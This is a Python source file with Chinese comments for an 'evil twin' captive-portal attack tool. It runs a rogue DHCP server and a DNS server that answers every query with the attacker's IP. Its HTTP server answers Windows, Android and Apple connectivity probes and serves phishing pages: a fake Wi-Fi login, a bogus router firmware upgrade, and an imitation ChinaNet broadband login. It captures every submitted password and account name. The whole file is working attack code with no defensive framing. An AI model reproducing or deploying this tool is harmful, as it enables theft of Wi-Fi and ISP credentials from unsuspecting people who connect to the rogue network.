# -*- coding: utf-8 -*-
"""
CaptivePortal —— Windows 邪恶孪生热点配套的强制门户（纯标准库）。

三件套（全部绑定到 Rogue AP 的虚拟网卡 IP，默认 192.168.137.1）：
  · DHCP（UDP 67）：自己发地址，绕开 ICS，DNS/网关都指到本机；
  · DNS （UDP 53）：任何域名都解析到门户 IP，强制全部 HTTP 流量落地；
  · HTTP（TCP 80）：钓鱼门户页，识别各系统 captive-portal 探针，捕获提交的口令。

设计说明：现代站点多为 HTTPS，DNS 虽能改地址但浏览器有证书校验，无法伪造；
真正起作用的是各系统的「联网检测」探针（明文 HTTP），设备据此弹出登录页，
用户在仿冒页面里输入的 WiFi 口令即被记录 —— 这与 wifiphisher 的原理一致。
"""
from __future__ import annotations

import socket
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

# ── 常量 ──
PORTAL_IP = "192.168.137.1"
POOL_PREFIX = "192.168.137."
POOL_START = 20
POOL_END = 120
SUBNET_MASK = "255.255.255.0"
LEASE_SECONDS = 86400

_DNS_A = 1
_BOOTP_MAGIC = struct.pack("!I", 0x63825363)


def _log_append(bucket: list, text: str) -> None:
    bucket.append(f"{time.strftime('%H:%M:%S')} {text}")
    if len(bucket) > 500:
        del bucket[: len(bucket) - 500]


# ============================================================
# DHCP 服务器
# ============================================================
class _DhcpServer(threading.Thread):
    def __init__(self, bound_ip: str, leases: dict, logs: list):
        super().__init__(daemon=True)
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._bound_ip = bound_ip
        self._leases = leases  # mac(str 无分隔) -> {"ip": str, "name": str, "updated": float}
        self._logs = logs

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    @staticmethod
    def _opt(options: bytes, code: int) -> bytes | None:
        i = 0
        while i < len(options):
            c = options[i]
            if c == 255:
                break
            if c == 0:
                i += 1
                continue
            if i + 1 >= len(options):
                break
            ln = options[i + 1]
            val = options[i + 2 : i + 2 + ln]
            if c == code:
                return val
            i += 2 + ln
        return None

    def _alloc_ip(self, mac: str) -> str:
        for info in self._leases.values():
            if info.get("mac") == mac:
                info["updated"] = time.time()
                return info["ip"]
        used = {info["ip"] for info in self._leases.values()}
        for last in range(POOL_START, POOL_END + 1):
            ip = f"{POOL_PREFIX}{last}"
            if ip not in used:
                self._leases[ip] = {"mac": mac, "updated": time.time(), "name": ""}
                return ip
        return ""

    def _build_reply(self, msg_type: int, xid: bytes, mac_bytes: bytes,
                     yiaddr: str, srv_ip: str) -> bytes:
        # op=2 BOOTREPLY；chaddr 填客户端 MAC
        head = struct.pack("!BBBB", 2, 1, 6, 0) + xid
        head += struct.pack("!HH", 0, 0)          # secs / flags
        head += socket.inet_aton("0.0.0.0")       # ciaddr
        head += socket.inet_aton(yiaddr)          # yiaddr
        head += socket.inet_aton(srv_ip)          # siaddr
        head += socket.inet_aton("0.0.0.0")       # giaddr
        chaddr = mac_bytes.ljust(16, b"\x00")
        head += chaddr + b"\x00" * 64 + b"\x00" * 128
        opts = _BOOTP_MAGIC
        opts += bytes([53, 1, msg_type])
        opts += bytes([54, 4]) + socket.inet_aton(srv_ip)
        opts += bytes([51, 4]) + struct.pack("!I", LEASE_SECONDS)
        opts += bytes([1, 4]) + socket.inet_aton(SUBNET_MASK)
        opts += bytes([3, 4]) + socket.inet_aton(srv_ip)
        opts += bytes([6, 4]) + socket.inet_aton(srv_ip)
        opts += b"\xff"
        return head + opts

    def run(self) -> None:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self._sock.bind((self._bound_ip, 67))
            self._sock.settimeout(1.0)
        except OSError as exc:
            _log_append(self._logs, f"[DHCP] 绑定失败：{exc}")
            return
        _log_append(self._logs, f"[DHCP] 已监听 {self._bound_ip}:67")

        while not self._stop.is_set():
            try:
                data, _addr = self._sock.recvfrom(2048)
            except socket.timeout:
                continue
            except OSError:
                break
            if len(data) < 240 or data[236:240] != _BOOTP_MAGIC:
                continue
            xid = data[4:8]
            mac_len = min(6, data[2])
            mac_bytes = data[28 : 28 + mac_len]
            mac_key = mac_bytes.hex()
            options = data[240:]
            mtype = self._opt(options, 53)
            if not mtype:
                continue
            mtype = mtype[0]
            hostname = self._opt(options, 12)
            if hostname:
                for info in self._leases.values():
                    if info.get("mac") == mac_key:
                        try:
                            info["name"] = hostname.decode("utf-8", "ignore")
                        except Exception:  # noqa: BLE001
                            pass

            if mtype == 1:  # DISCOVER
                ip = self._alloc_ip(mac_key)
                if not ip:
                    continue
                reply = self._build_reply(2, xid, mac_bytes, ip, self._bound_ip)
                _log_append(self._logs, f"[DHCP] DISCOVER {mac_key} → OFFER {ip}")
            elif mtype == 3:  # REQUEST
                ip = self._alloc_ip(mac_key)
                if not ip:
                    continue
                reply = self._build_reply(5, xid, mac_bytes, ip, self._bound_ip)
                _log_append(self._logs, f"[DHCP] REQUEST {mac_key} → ACK {ip}")
            elif mtype == 7:  # RELEASE
                for rip, info in list(self._leases.items()):
                    if info.get("mac") == mac_key:
                        self._leases.pop(rip, None)
                continue
            else:
                continue
            try:
                # 客户端此时尚无 IP，广播回送
                self._sock.sendto(reply, ("255.255.255.255", 68))
            except OSError:
                pass


# ============================================================
# DNS 服务器：所有查询都返回门户 IP
# ============================================================
class _DnsServer(threading.Thread):
    def __init__(self, bound_ip: str, portal_ip: str, logs: list):
        super().__init__(daemon=True)
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._bound_ip = bound_ip
        self._portal_ip = portal_ip
        self._logs = logs
        self.queries = 0
        self.ok = False   # 端口 53 是否成功接管

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def run(self) -> None:
        # 移动热点模式下系统 ICS 的 DNS 代理可能先占 53；带重试的接管
        for attempt in range(4):
            try:
                self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._sock.bind((self._bound_ip, 53))
                self._sock.settimeout(1.0)
                break
            except OSError as exc:
                _log_append(self._logs, f"[DNS] 绑定失败（第 {attempt + 1} 次）：{exc}")
                if self._sock:
                    try:
                        self._sock.close()
                    except OSError:
                        pass
                    self._sock = None
                if attempt == 3:
                    return
                time.sleep(1.0)
        self.ok = True
        _log_append(self._logs, f"[DNS] 已监听 {self._bound_ip}:53（全部解析到 {self._portal_ip}）")

        while not self._stop.is_set():
            try:
                data, addr = self._sock.recvfrom(1024)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                reply = self._answer(data)
                self._sock.sendto(reply, addr)
                self.queries += 1
            except Exception:  # noqa: BLE001
                pass

    def _answer(self, data: bytes) -> bytes:
        if len(data) < 12:
            return data
        tid = data[0:2]
        # flags: QR=1 Opcode=0 AA=1 TC=0 RD=1 RA=1 Z=0 RCODE=0
        flags = struct.pack("!H", 0x8580)
        qdcount = data[4:6]
        header = tid + flags + qdcount + struct.pack("!HHH", 1, 0, 0)

        # 解析 question（qname 变长）
        offset = 12
        qnames: list[bytes] = []
        while offset < len(data):
            ln = data[offset]
            if ln == 0:
                offset += 1
                break
            qnames.append(data[offset + 1 : offset + 1 + ln])
            offset += 1 + ln
        if offset + 4 > len(data):
            return header
        qtype, qclass = struct.unpack("!HH", data[offset : offset + 4])
        question = data[12 : offset + 4]

        # A 查询：回门户 IP；AAAA/其他：NOERROR 空回答（让客户端回退 A 记录）
        answer = b""
        if qtype == _DNS_A:
            answer = b"\xc0\x0c"
            answer += struct.pack("!HHIH", qtype, qclass, 30, 4)
            answer += socket.inet_aton(self._portal_ip)
            header = tid + flags + qdcount + struct.pack("!HHH", 1, 1, 0)
        return header + question + answer


# ============================================================
# HTTP 钓鱼门户
# ============================================================
_TEMPLATES: dict[str, dict] = {}


def _portal_page_generic(ssid: str) -> str:
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>登录到 Wi-Fi 网络</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;
background:linear-gradient(160deg,#e8edf5,#d7deea);min-height:100vh;
display:flex;align-items:center;justify-content:center;padding:20px}}
.card{{background:#fff;border-radius:18px;box-shadow:0 20px 60px rgba(30,50,90,.18);
padding:34px 30px;max-width:380px;width:100%}}
.wifi-ico{{font-size:44px;text-align:center;margin-bottom:8px}}
h1{{font-size:19px;color:#1f2a44;text-align:center;font-weight:600}}
.ssid{{text-align:center;color:#7a869e;font-size:13px;margin:6px 0 24px}}
label{{display:block;font-size:12px;color:#7a869e;margin-bottom:6px}}
input{{width:100%;padding:13px 14px;border:1px solid #dfe5ef;border-radius:11px;
font-size:15px;outline:none}}
input:focus{{border-color:#4a7dff}}
button{{width:100%;margin-top:20px;padding:14px;border:none;border-radius:11px;
background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;font-size:15px;
font-weight:600;cursor:pointer}}
.note{{text-align:center;font-size:11px;color:#a8b2c6;margin-top:16px}}
</style></head><body><form class="card" method="post" action="/login">
<div class="wifi-ico">📶</div>
<h1>需要登录才能使用互联网</h1><div class="ssid">{ssid}</div>
<label>WiFi 密码</label>
<input type="password" name="password" autofocus required autocomplete="off">
<button type="submit">连 接</button>
<div class="note">由网络管理员提供 · 安全连接</div>
</form></body></html>"""


def _portal_page_firmware(ssid: str) -> str:
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>路由器固件升级</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:"Microsoft YaHei","Segoe UI",sans-serif;background:#eef1f5;
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.card{{background:#fff;border-radius:10px;box-shadow:0 10px 40px rgba(0,0,0,.15);
max-width:460px;width:100%;overflow:hidden}}
.bar{{background:linear-gradient(135deg,#1e3a5f,#2d5a8c);color:#fff;padding:18px 24px;
font-size:17px;font-weight:600}}
.body{{padding:28px 24px}}
p{{color:#444;font-size:13.5px;line-height:1.9;margin-bottom:18px}}
label{{display:block;font-size:12px;color:#666;margin:12px 0 6px}}
input{{width:100%;padding:11px 12px;border:1px solid #ccd;border-radius:6px;
font-size:14px;outline:none}}
button{{width:100%;margin-top:22px;padding:12px;border:none;border-radius:6px;
background:#2d6cdf;color:#fff;font-size:14px;font-weight:600;cursor:pointer}}
.warn{{background:#fff8e6;border-left:3px solid #f0ad4e;padding:10px 12px;
font-size:12px;color:#8a6d3b;margin-bottom:16px}}
</style></head><body><div class="card">
<div class="bar">⚙ 系统固件升级中</div>
<div class="body">
<div class="warn">升级期间无线服务将短暂重启，请重新验证您的无线网络以避免配置丢失。</div>
<p>检测到新固件版本。为完成升级，请输入当前无线网络 <b>{ssid}</b> 的密码，
系统将在重启后自动恢复连接。</p>
<form method="post" action="/login">
<label>无线网络名称（SSID）</label>
<input name="ssid" value="{ssid}">
<label>WiFi 密码</label>
<input type="password" name="password" required autocomplete="off">
<button type="submit">提交并完成升级</button>
</form></div></div></body></html>"""


def _portal_page_oauth(ssid: str) -> str:
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>运营商宽带认证</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,"Microsoft YaHei",sans-serif;background:#f4f6fa;
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.card{{background:#fff;border-radius:16px;box-shadow:0 12px 44px rgba(20,40,80,.14);
padding:32px 28px;max-width:380px;width:100%}}
.brand{{text-align:center;font-size:15px;color:#2b5cd0;font-weight:700;margin-bottom:4px}}
h1{{font-size:20px;color:#1f2a44;text-align:center;margin:10px 0 4px}}
.sub{{text-align:center;color:#8a94aa;font-size:12.5px;margin-bottom:24px}}
label{{display:block;font-size:12px;color:#7a869e;margin-bottom:6px}}
input{{width:100%;padding:12px 13px;border:1px solid #dfe5ef;border-radius:10px;
font-size:14.5px;outline:none;margin-bottom:14px}}
button{{width:100%;padding:13px;border:none;border-radius:10px;
background:linear-gradient(135deg,#2b5cd0,#1d44a8);color:#fff;font-size:15px;
font-weight:600;cursor:pointer}}
</style></head><body><form class="card" method="post" action="/login">
<div class="brand">ChinaNet · 宽带接入认证</div>
<h1>登录网络</h1><div class="sub">{ssid} · 已连接</div>
<label>宽带账号 / 手机号</label>
<input name="username" required autocomplete="off">
<label>密码</label>
<input type="password" name="password" required autocomplete="off">
<button type="submit">登 录</button>
</form></body></html>"""


_TEMPLATES["wifi_login"] = _portal_page_generic
_TEMPLATES["firmware"] = _portal_page_firmware
_TEMPLATES["oauth"] = _portal_page_oauth


_SUCCESS = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>正在连接…</title><style>
body{font-family:"Microsoft YaHei",sans-serif;background:#f2f5fa;text-align:center;
padding:80px 20px;color:#556}
.sp{width:42px;height:42px;border:4px solid #cfd8ea;border-top-color:#3b82f6;
border-radius:50%;margin:0 auto 22px;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
</style></head><body><div class="sp"></div><p>身份验证成功，正在重新连接网络…</p></body></html>"""


# 各系统联网探针：返回 200+HTML（而非它们期待的特征内容）→ 系统判定需要登录
_PROBE_PATHS = {
    "/generate_204", "/connecttest.txt", "/ncsi.txt", "/redirect",
    "/hotspot-detect.html", "/library/test/success.html",
    "/mobile/status.php", "/favicon.ico",
}


class _PortalHandler(BaseHTTPRequestHandler):
    bound_ssid = ""
    template = "wifi_login"
    captures: list = []
    logs: list = []

    def log_message(self, *args):  # 静默默认日志
        return

    def _send_html(self, html: str, code: int = 200) -> None:
        body = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        try:
            self.wfile.write(body)
        except OSError:
            pass

    def do_GET(self) -> None:  # noqa: N802
        path = self.path.split("?", 1)[0]
        ua = self.headers.get("User-Agent", "")
        if path in _PROBE_PATHS or path.startswith("/generate_204"):
            _log_append(self.logs, f"[HTTP] 探针 {path}  ← {ua[:40]}")
        else:
            _log_append(self.logs, f"[HTTP] GET {path}  ← {self.client_address[0]}")
        page = _TEMPLATES.get(self.template, _portal_page_generic)(self.bound_ssid)
        self._send_html(page)

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        fields = {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "ignore")).items()}
        entry = {
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "ip": self.client_address[0],
            "template": self.template,
            "fields": fields,
        }
        self.captures.append(entry)
        _log_append(self.logs, f"[HTTP] ★ 捕获提交：{fields}")
        self._send_html(_SUCCESS)


# ============================================================
# 门户总管
# ============================================================
class CaptivePortal:
    def __init__(self, ssid: str, template: str = "wifi_login",
                 bound_ip: str = PORTAL_IP, with_dhcp: bool = True):
        self.ssid = ssid
        self.template = template if template in _TEMPLATES else "wifi_login"
        self.bound_ip = bound_ip
        self.with_dhcp = with_dhcp   # hotspot 模式下系统 ICS 已提供 DHCP，无需自管
        self.logs: list = []
        self.captures: list = []
        self.leases: dict = {}
        self._dhcp: _DhcpServer | None = None
        self._dns: _DnsServer | None = None
        self._http: ThreadingHTTPServer | None = None

    def start(self) -> None:
        _log_append(self.logs, f"[门户] 启动：SSID={self.ssid} 模板={self.template} "
                               f"DHCP={'自管' if self.with_dhcp else '系统 ICS'}")

        if self.with_dhcp:
            self._dhcp = _DhcpServer(self.bound_ip, self.leases, self.logs)
            self._dhcp.start()

        self._dns = _DnsServer(self.bound_ip, self.bound_ip, self.logs)
        self._dns.start()

        # 给 HTTP handler 挂上共享状态（类属性，单门户实例）
        _PortalHandler.bound_ssid = self.ssid
        _PortalHandler.template = self.template
        _PortalHandler.captures = self.captures
        _PortalHandler.logs = self.logs
        self._http = ThreadingHTTPServer((self.bound_ip, 80), _PortalHandler)
        http_thread = threading.Thread(target=self._http.serve_forever, daemon=True)
        http_thread.start()
        _log_append(self.logs, f"[HTTP] 门户页已监听 {self.bound_ip}:80")

    def stop(self) -> None:
        _log_append(self.logs, "[门户] 停止中…")
        if self._http:
            try:
                self._http.shutdown()
                self._http.server_close()
            except OSError:
                pass
        if self._dns:
            self._dns.stop()
        if self._dhcp:
            self._dhcp.stop()

    def status(self) -> dict:
        return {
            "ssid": self.ssid,
            "template": self.template,
            "bound_ip": self.bound_ip,
            "with_dhcp": self.with_dhcp,
            "dns_active": bool(self._dns and self._dns.ok),
            "leases": [{"ip": ip, **info} for ip, info in self.leases.items()],
            "dns_queries": self._dns.queries if self._dns else 0,
            "captures": self.captures,
        }
